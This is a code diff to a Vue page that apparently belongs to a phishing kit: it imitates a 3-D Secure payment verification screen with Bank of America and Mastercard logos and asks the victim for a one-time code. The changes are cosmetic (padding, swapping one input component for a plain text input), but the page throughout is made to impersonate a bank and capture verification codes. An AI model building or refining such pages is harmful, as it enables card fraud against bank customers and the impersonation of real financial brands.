@@ -1,7 +1,6 @@
 <script setup lang="ts">
 import LoadStripe from "~/components/phishing/loadings/LoadStripe.vue";
 import {useLoadingStore} from "~/stores/loading";
-import InputText from 'primevue/inputtext';
 
 definePageMeta({
   layout: false,
@@ -20,7 +19,7 @@ const code = ref("");
 
 <template>
   <div class="threeds-container">
-    <div class="threeds-header">
+    <div class="threeds-header p-6">
       <img src="@/assets/img/Bank%20of%20American.svg" alt="Bank" class="bank-logo" />
       <img src="@/assets/img/mastercard-logo.png" class="gateway-logo" />
     </div>
@@ -31,8 +30,8 @@ const code = ref("");
       <p>You are paying <span class="strong">{{bank}}</span> the amount of <span class="strong">{{money}}</span> on <span class="strong">{{date}}.</span></p>
 
       <h4>Enter your code below2:</h4>
-      <InputText id="username" v-model="code" />
-<!--      <div><input type="text" v-model="code"/></div>-->
+<!--      <InputText id="username" v-model="code" />-->
+      <div><input type="text" v-model="code"/></div>
 
       <button class="btn btn-a">SUBMIT</button>
       <button class="btn btn-b">RESEND CODE</button>
